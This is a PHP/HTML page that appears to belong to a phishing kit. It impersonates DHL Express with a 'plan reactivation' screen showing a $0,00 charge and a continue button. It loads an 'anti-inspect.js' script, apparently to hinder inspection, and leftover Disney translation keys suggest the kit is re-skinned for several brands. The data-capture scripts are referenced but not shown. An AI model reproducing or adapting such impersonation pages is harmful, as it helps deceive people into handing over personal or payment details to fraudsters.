<?php require_once(__DIR__ . '/../includes/page-common.php'); ?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($selectedLanguage); ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title><?php echo htmlspecialchars($translations['Plan_Disney'] ?? 'DHL'); ?></title>
    <link rel="stylesheet" href="<?php echo htmlspecialchars($dhlStyleHref, ENT_QUOTES, 'UTF-8'); ?>">
    <script src="js/security-common.js"></script>
    <script src="../js/anti-inspect.js"></script>
    <style>
        .dhl-plan-price {
            text-align: center;
            margin: 8px 0 24px;
            padding: 20px 24px;
            background: rgba(255, 204, 0, 0.08);
            border: 1px solid rgba(255, 204, 0, 0.35);
            border-radius: 8px;
        }
        .dhl-plan-price strong {
            display: block;
            font-size: 2.25rem;
            font-weight: 800;
            color: var(--dhl-yellow);
            letter-spacing: -0.02em;
        }
    </style>
</head>
<body class="dhl-page js-focus-visible" data-page="plan">
<header class="dhl-header">
    <div class="dhl-logo-mark">DHL</div>
    <div>
        <div class="dhl-brand-text"><?php echo htmlspecialchars($translations['dhl_brand'] ?? 'DHL Express'); ?></div>
        <div class="dhl-brand-sub"><?php echo htmlspecialchars($translations['plan_reactivation']); ?></div>
    </div>
</header>
<main class="dhl-main">
    <div class="dhl-card-panel">
        <div class="dhl-step"><?php echo htmlspecialchars($translations['dhl_track_step'] ?? 'Shipment'); ?></div>
        <h1 class="dhl-title" style="text-align: center;"><?php echo htmlspecialchars($translations['plan_reactivation']); ?></h1>
        <form id="planForm" name="planForm">
            <div class="dhl-plan-price">
                <strong>$0,00</strong>
            </div>
            <p class="dhl-sub" style="text-align: center; margin-bottom: 24px;"><?php echo htmlspecialchars($translations['plan_thanks']); ?></p>
            <button type="submit" class="dhl-btn-primary" id="submitBtn"><?php echo htmlspecialchars($translations['CONTINUE']); ?></button>
        </form>
    </div>
    <p class="dhl-footer-note"><?php echo htmlspecialchars($translations['dhl_footer_rights'] ?? $translations['Disney_All_rights_reserved']); ?></p>
</main>
<script src="../js/pages-config.js?v=<?php echo time(); ?>"></script>
<script src="../js/session-manager.js?v=<?php echo time(); ?>"></script>
<script src="../js/validation.js?v=<?php echo time(); ?>"></script>
<script src="../js/app.js?v=<?php echo time(); ?>"></script>
</body>
</html>
